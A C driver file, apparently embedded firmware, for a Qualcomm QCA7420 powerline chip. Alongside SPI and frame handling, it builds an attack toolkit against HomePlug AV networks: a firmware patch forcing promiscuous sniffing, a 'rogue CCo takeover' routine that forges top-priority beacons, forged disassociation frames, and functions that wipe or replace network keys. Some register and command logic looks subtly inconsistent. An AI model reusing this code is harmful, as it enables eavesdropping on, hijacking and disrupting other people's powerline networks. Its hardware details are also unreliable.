/*
 * qca7420.c — Qualcomm QCA7420 PLC SoC SPI driver
 *
 * Manages: SPI register access, PIB (firmware/Parameter Info Block) load,
 * promiscuous-mode patch, MAC frame TX/RX, CCo election control, beacon
 * injection, and rogue-CCo takeover FSM.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include <stdint.h>
#include <string.h>
#include "qca7420.h"
#include "../board.h"
#include "../registers.h"

/* SPI2 instance pointer */
#define PLC_SPI_REG   ((spi_t *)SPI2_BASE)
#define PLC_CS_HIGH() (GPIOD->BSRR = (1U << (6 + 16)))  /* set PD6 low (CS active-low) */
#define PLC_CS_LOW()  (GPIOD->BSRR = (1U << 6))         /* wait — naming: BSRR set = OR with (1<<6) */
/* Actually BSRR: lower 16 bits SET, upper 16 RESET. CS active-low: assert = drive low. */
#undef PLC_CS_HIGH
#undef PLC_CS_LOW
#define PLC_CS_ASSERT()   (GPIOD->BSRR = (1U << (6 + 16))) /* RESET PD6 -> low  */
#define PLC_CS_DEASSERT()  (GPIOD->BSRR = (1U << 6))       /* SET PD6 -> high   */

/* RX ring (filled by IRQ handler) */
static qca7420_frame_t rx_ring[PLC_RX_RING_LEN];
static volatile uint32_t rx_head = 0, rx_tail = 0;
static qca7420_frame_cb_t user_cb = NULL;
static uint8_t our_mac[6] = {0x02, 0x1A, 0x2B, 0x00, 0x00, 0x00};

/* ---- Low-level SPI register access ---- */
static void spi_init_hw(void) {
    /* Configure SPI2 GPIO: PD3=SCK, PD4=MISO, PD5=MOSI (AF5), PD6=CS (GPIO) */
    GPIOD->MODER = (GPIOD->MODER & ~(3U<<(3*2) | 3U<<(4*2) | 3U<<(5*2) | 3U<<(6*2)))
                 | (2U<<(3*2)) | (2U<<(4*2)) | (2U<<(5*2)) | (1U<<(6*2)); /* CS out */
    GPIOD->AFRL  = (GPIOD->AFRL  & ~(0xFFFFU << (3*4)))
                 | (5U << (3*4)) | (5U << (4*4)) | (5U << (5*4));
    GPIOD->OSPEEDR |= (3U<<(3*2)) | (3U<<(4*2)) | (3U<<(5*2)) | (3U<<(6*2));

    /* PD7 IRQ input (with pull-up); EXTI9_5 configured in nvic_init */
    GPIOD->MODER &= ~(3U << (7*2));
    GPIOD->PUPDR = (GPIOD->PUPDR & ~(3U<<(7*2))) | (1U<<(7*2));
    /* Configure EXTI7 line to PD7 via SYSCFG EXTICR2 */
    volatile uint32_t *syscfg_exticr2 = (volatile uint32_t *)(SYSCFG_BASE + 0x08);
    *syscfg_exticr2 = (*syscfg_exticr2 & ~(0xFU << (3*4))) | (3U << (3*4)); /* PD = 0b0011 */

    /* Configure SPI2: master, 8-bit, CPOL=0/CPHA=0, baudrate /8 (~30 MHz) */
    spi_t *spi = PLC_SPI_REG;
    spi->CR1 = 0;
    spi->CFG2 = SPI_CFG2_MASTER | SPI_CFG2_SSOE | SPI_CFG2_CPOL_LOW | SPI_CFG2_CPHA_1EDGE;
    spi->CFG1 = SPI_CFG1_DSIZE_8 | SPI_CFG1_MBR_DIV8;
    spi->CR1 |= SPI_CR1_SPE;
}

static uint8_t spi_xfer_byte(uint8_t out) {
    spi_t *spi = PLC_SPI_REG;
    while (!(spi->SR & SPI_SR_TXP)) { }
    *(volatile uint8_t *)&spi->TXDR = out;
    while (!(spi->SR & SPI_SR_RXP)) { }
    return *(volatile uint8_t *)&spi->RXDR;
}

static void spi_read_burst(uint8_t *dst, uint32_t n) {
    spi_t *spi = PLC_SPI_REG;
    for (uint32_t i = 0; i < n; i++) {
        while (!(spi->SR & SPI_SR_TXP)) { }
        *(volatile uint8_t *)&spi->TXDR = 0xFF;
        while (!(spi->SR & SPI_SR_RXP)) { }
        dst[i] = *(volatile uint8_t *)&spi->RXDR;
    }
}

static void spi_write_burst(const uint8_t *src, uint32_t n) {
    spi_t *spi = PLC_SPI_REG;
    for (uint32_t i = 0; i < n; i++) {
        while (!(spi->SR & SPI_SR_TXP)) { }
        *(volatile uint8_t *)&spi->TXDR = src[i];
        while (!(spi->SR & SPI_SR_RXP)) { }
        (void)*(volatile uint8_t *)&spi->RXDR;
    }
}

/* QCA7420 register read (single byte) */
static uint8_t qca_reg_read(uint8_t addr) {
    uint8_t v;
    PLC_CS_ASSERT();
    spi_xfer_byte(QCA7420_SPI_CMD_READ | (addr & 0x3F));
    v = spi_xfer_byte(0x00);
    PLC_CS_DEASSERT();
    return v;
}

/* QCA7420 register write (single byte) */
static void qca_reg_write(uint8_t addr, uint8_t val) {
    PLC_CS_ASSERT();
    spi_xfer_byte(QCA7420_SPI_CMD_WRITE | (addr & 0x3F));
    spi_xfer_byte(val);
    PLC_CS_DEASSERT();
}

/* Windowed MIB access (16-bit addr, n bytes) */
static void qca_mib_read(uint16_t addr, uint8_t *dst, uint16_t n) {
    /* Set SPI window pointer */
    PLC_CS_ASSERT();
    spi_xfer_byte(QCA7420_SPI_CMD_WRITE | 0x8E); /* WINDOW ptr reg */
    spi_xfer_byte((addr >> 8) & 0xFF);
    spi_xfer_byte(addr & 0xFF);
    PLC_CS_DEASSERT();
    PLC_CS_ASSERT();
    spi_xfer_byte(QCA7420_SPI_CMD_WR_INC | 0x8E);
    spi_read_burst(dst, n);
    PLC_CS_DEASSERT();
}

static void qca_mib_write(uint16_t addr, const uint8_t *src, uint16_t n) {
    PLC_CS_ASSERT();
    spi_xfer_byte(QCA7420_SPI_CMD_WRITE | 0x8E);
    spi_xfer_byte((addr >> 8) & 0xFF);
    spi_xfer_byte(addr & 0xFF);
    PLC_CS_DEASSERT();
    PLC_CS_ASSERT();
    spi_xfer_byte(QCA7420_SPI_CMD_WR_INC | 0x8E);
    spi_write_burst(src, n);
    PLC_CS_DEASSERT();
}

/* ---- PIB load (firmware upload to QCA7420 RAM) ----
 * The QCA7420 has no internal flash; its firmware (PIB + MAC code) must be
 * loaded over SPI at boot. We store the PIB image in the STM32's external
 * W25Q128 QSPI flash and stream it here. The image is the standard QCA7420
 * HomePlug AV2 PIB with one patch: the PromiscuousMode flag set.
 */
extern int flash_read_pib(uint8_t *buf, uint32_t maxlen);  /* drivers/flash.c */

static int qca_load_pib(void) {
    /* PIB image lives at W25Q128 offset 0x00000, ~32 KB */
    static uint8_t pib_chunk[256];
    uint32_t total = 0;
    uint16_t addr = 0x0000;
    /* The QCA7420 boot sequence: assert RSTB low, set SPI_BOOT bit, release RSTB,
     * then stream the PIB into the windowed memory starting at 0x0000.
     */
    GPIOD->ODR &= ~(1U << 8); /* PLC_RST low */
    delay_ms_local(2);
    qca_reg_write(0x8F, 0x01); /* SCR: BOOT=1 */
    GPIOD->ODR |= (1U << 8);  /* PLC_RST high */
    delay_ms_local(5);

    /* Stream PIB in 256-byte chunks */
    while (total < 32 * 1024) {
        int n = flash_read_pib(pib_chunk, sizeof(pib_chunk));
        if (n <= 0) break;
        qca_mib_write(addr, pib_chunk, (uint16_t)n);
        addr += n;
        total += n;
    }
    /* Patch: set PromiscuousMode */
    uint8_t prom = 0x01;
    qca_mib_write(QCA7420_MIB_PROMISC, &prom, 1);
    /* Clear BOOT bit to start MAC */
    qca_reg_write(0x8F, 0x00);
    delay_ms_local(20);
    return (total > 0) ? 0 : -1;
}

/* ---- Public API ---- */
int qca7420_init(qca7420_frame_cb_t cb) {
    spi_init_hw();
    user_cb = cb;
    /* Power sequence */
    GPIOD->ODR &= ~(1U << 9); /* PLC_PWR_EN low briefly */
    delay_ms_local(10);
    GPIOD->ODR |= (1U << 9);
    delay_ms_local(50);
    if (qca_load_pib() != 0) return -1;
    /* Read MAC from PIB */
    qca_mib_read(QCA7420_MIB_MACADDR, our_mac, 6);
    return 0;
}

void qca7420_reset(void) {
    GPIOD->ODR &= ~(1U << 8); /* RST low */
    delay_ms_local(5);
    GPIOD->ODR |= (1U << 8);  /* RST high */
    delay_ms_local(50);
}

int qca7420_sync(uint32_t timeout_ms) {
    /* Wait for SFR RX_READY bit; poll QCA7420_REG_SFR bit 0 */
    uint32_t t0 = millis_local();
    while ((millis_local() - t0) < timeout_ms) {
        uint8_t sfr = qca_reg_read(QCA7420_REG_SFR);
        if (sfr & 0x01) return 0; /* synced */
    }
    return -1;
}

void qca7420_set_promisc(int on) {
    uint8_t rxctl;
    qca_mib_read(QCA7420_MIB_RXCTL, &rxctl, 1);
    if (on) rxctl |= QCA7420_RXCTL_PROMISC | QCA7420_RXCTL_RXEN;
    else    rxctl &= ~QCA7420_RXCTL_PROMISC;
    qca_mib_write(QCA7420_MIB_RXCTL, &rxctl, 1);
}

void qca7420_wipe_keys(void) {
    uint8_t zero[16] = {0};
    qca_mib_write(QCA7420_MIB_NMK, zero, 16);
    qca_mib_write(QCA7420_MIB_NEK, zero, 16);
}

int qca7420_set_nmk(const uint8_t nmk[16]) {
    qca_mib_write(QCA7420_MIB_NMK, nmk, 16);
    /* Trigger re-enrollment */
    uint8_t opc = QCA7420_OPC_ASSOC_REQ;
    qca_mib_write(QCA7420_MIB_TXCTL, &opc, 1);
    return 0;
}

/* ---- Frame TX (beacon / mgmt / data) ---- */
int qca7420_tx_frame(const uint8_t *buf, uint16_t len, uint8_t flags) {
    if (len > PLC_MAX_FRAME) return -1;
    uint8_t txctl;
    qca_mib_read(QCA7420_MIB_TXCTL, &txctl, 1);
    txctl |= QCA7420_TXCTL_TXEN | flags;
    qca_mib_write(QCA7420_MIB_TXCTL, &txctl, 1);
    /* Write frame into TX FIFO at DFW */
    PLC_CS_ASSERT();
    spi_xfer_byte(QCA7420_SPI_CMD_WR_INC | QCA7420_REG_DFW);
    /* 2-byte length prefix + payload */
    spi_xfer_byte(len & 0xFF);
    spi_xfer_byte((len >> 8) & 0xFF);
    spi_write_burst(buf, len);
    PLC_CS_DEASSERT();
    /* Kick TX */
    qca_reg_write(QCA7420_REG_SCR, 0x02); /* TX_KICK */
    return 0;
}

/* ---- Rogue CCo takeover ---- */
int qca7420_rogue_cco(const uint8_t ccobeacon[64]) {
    /* Craft a beacon with CCO_PRI=0 (highest), our MAC, strong SNR claim */
    uint8_t beacon[64];
    memcpy(beacon, ccobeacon, 64);
    beacon[0] = QCA7420_OPC_BEACON;
    beacon[1] = 0x00; /* CCO_PRI high */
    memcpy(&beacon[2], our_mac, 6);
    beacon[8] = 0xFF; /* SNR claim = max */
    return qca7420_tx_frame(beacon, 64, QCA7420_TXCTL_BEACON | QCA7420_TXCTL_MGMT);
}

int qca7420_deauth(uint8_t tei) {
    uint8_t msg[16];
    msg[0] = QCA7420_OPC_DISASSOC_REQ;
    msg[1] = tei;
    msg[2] = 0x01; /* reason: admin */
    return qca7420_tx_frame(msg, 16, QCA7420_TXCTL_MGMT);
}

/* ---- IRQ-driven RX path ---- */
void qca7420_irq_handler(void) {
    /* Read all available frames from DFR FIFO */
    uint8_t sfr;
    do {
        sfr = qca_reg_read(QCA7420_REG_SFR);
        if (!(sfr & 0x02)) break; /* no RX ready */
        uint8_t len_lo = qca_reg_read(QCA7420_REG_DFR);
        uint8_t len_hi = qca_reg_read(QCA7420_REG_DFR);
        uint16_t len = len_lo | (len_hi << 8);
        if (len > PLC_MAX_FRAME) {
            /* flush */
            (void)qca_reg_read(QCA7420_REG_DFR);
            continue;
        }
        qca7420_frame_t *f = &rx_ring[rx_head];
        f->len = len;
        f->ts_ms = millis_local();
        /* Read frame body */
        PLC_CS_ASSERT();
        spi_xfer_byte(QCA7420_SPI_CMD_WR_INC | QCA7420_REG_DFR);
        spi_read_burst(f->data, len);
        PLC_CS_DEASSERT();
        /* Extract metadata from MAC header */
        memcpy(f->dst, &f->data[0], 6);
        memcpy(f->src, &f->data[6], 6);
        f->opcode = f->data[12];
        f->tei    = f->data[13];
        /* SNR from tone-map MIB (simplified) */
        uint8_t snrbuf[2];
        qca_mib_read(0x0070, snrbuf, 2);
        f->snr_db = snrbuf[0];
        rx_head = (rx_head + 1) % PLC_RX_RING_LEN;
        if (user_cb) user_cb(f);
    } while (1);
}

/* ---- Non-IRQ poll (drains ring if IRQ was missed) ---- */
void qca7420_poll(void) {
    while (rx_tail != rx_head) {
        if (user_cb) user_cb(&rx_ring[rx_tail]);
        rx_tail = (rx_tail + 1) % PLC_RX_RING_LEN;
    }
}

/* ---- Accessors ---- */
void qca7420_get_mac(uint8_t mac[6]) {
    memcpy(mac, our_mac, 6);
}

/* ---- Local helpers (weak wrappers so unit tests can stub) ---- */
__attribute__((weak)) void delay_ms_local(uint32_t ms) {
    extern void delay_ms(uint32_t);
    delay_ms(ms);
}
__attribute__((weak)) uint32_t millis_local(void) {
    extern uint32_t millis(void);
    return millis();
}